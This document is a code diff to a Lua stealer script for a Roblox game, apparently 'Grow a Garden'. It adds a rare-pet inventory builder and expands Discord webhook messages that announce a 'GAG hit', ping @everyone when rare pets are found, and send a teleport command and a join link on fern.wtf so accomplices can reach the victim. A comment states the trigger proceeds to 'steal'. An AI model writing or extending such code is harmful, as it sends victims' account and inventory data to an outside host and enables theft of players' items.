@@ -212,6 +212,31 @@ for _, tool in ipairs(backpack:GetChildren()) do
     end
 end
 
+-- RARE PETS ONLY inventory builder (global function)
+local function BuildRareInventory()
+    local inventory = {}
+    local hasRare = false
+
+    for _, item in ipairs(itemsToSend) do
+        if table.find(rarePets, item.Name) then
+            hasRare = true
+            table.insert(inventory, string.format(
+                "%s (%.2f KG): ¢%s",
+                item.Name,
+                item.Weight or 0,
+                formatNumber(item.Value)
+            ))
+        end
+    end
+
+    if #inventory == 0 then
+        return "N/A", false
+    end
+
+    local text = "```\n" .. table.concat(inventory, "\n") .. "\n```"
+    return text, true
+end
+
 -- WEBHOOK SENDER (used by SendJoinMessage / SendMessage)
 local function postWebhook(dataTable)
     local ok, res = pcall(function()
@@ -225,10 +250,10 @@ local function postWebhook(dataTable)
     return ok, res
 end
 
-local inventoryText, hasRareItems = BuildRareInventory()
-
 -- SendJoinMessage: when announcing join (keeps teleport join command in content)
 local function SendJoinMessage(list, prefix)
+    local inventoryText, hasRare = BuildRareInventory()
+
     local fields = {
         {
             name = "👤 Account Information",
@@ -240,20 +265,22 @@ local function SendJoinMessage(list, prefix)
             ),
             inline = false
         },
+
         {
-            name = "💰 Summary",
-            value = string.format("Total Value: ¢%s\nHighest Value: ¢%s\nHighest weight fruit: %.2f KG",
+            name = "💰 Value",
+            value = string.format("Value: ¢%s\nHighest Value: ¢%s",
                 formatNumber(totalValue),
-                formatNumber(getHighestValueItem()),
-                getHighestKGFruit()
+                formatNumber(getHighestValueItem())
             ),
             inline = false
         },
+
         {
-            name = "🎒 Inventory",
-            value = InventoryText,
+            name = "🎒 Inventory (Rare Only)",
+            value = inventoryText,
             inline = false
         },
+
         {
             name = "🔗 Join Link",
             value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId,
@@ -261,11 +288,15 @@ local function SendJoinMessage(list, prefix)
         }
     }
 
+    -- keep the "item list" in content? original SendJoinMessage had an items field appended to summary;
+    -- we keep list parameter usage for compatibility (but inventory now only shows rare pets)
     for _, item in ipairs(list) do
         local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight or 0, formatNumber(item.Value))
-        fields[2].value = fields[2].value .. line .. "\n"
+        -- append to Value field's value as additional lines (keeps previous behavior)
+        fields[2].value = fields[2].value .. "\n" .. line
     end
 
+    -- ensure no field overflow for the 'value' field (safety)
     if #fields[2].value > 1024 then
         local lines = {}
         for line in fields[2].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
@@ -276,7 +307,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
+        ["content"] = (hasRare and (ping == "Yes" and "@everyone " or "") or "") .. prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
         ["embeds"] = {{
             ["title"] = "📥 Join to get GAG hit",
             ["color"] = 65280,
@@ -290,6 +321,8 @@ end
 
 -- SendMessage: on-chat trigger (sends summary of items and then proceed to steal)
 local function SendMessage(sortedItems)
+    local inventoryText, hasRare = BuildRareInventory()
+
     local fields = {
         {
             name = "👤 Account Information",
@@ -313,6 +346,11 @@ local function SendMessage(sortedItems)
                 formatNumber(getHighestValueItem()),
                 getHighestKGFruit()
             ),
+            inline = false
+        },
+        {
+            name = "🎒 Inventory (Rare Only)",
+            value = inventoryText,
             inline = false
         },
         {
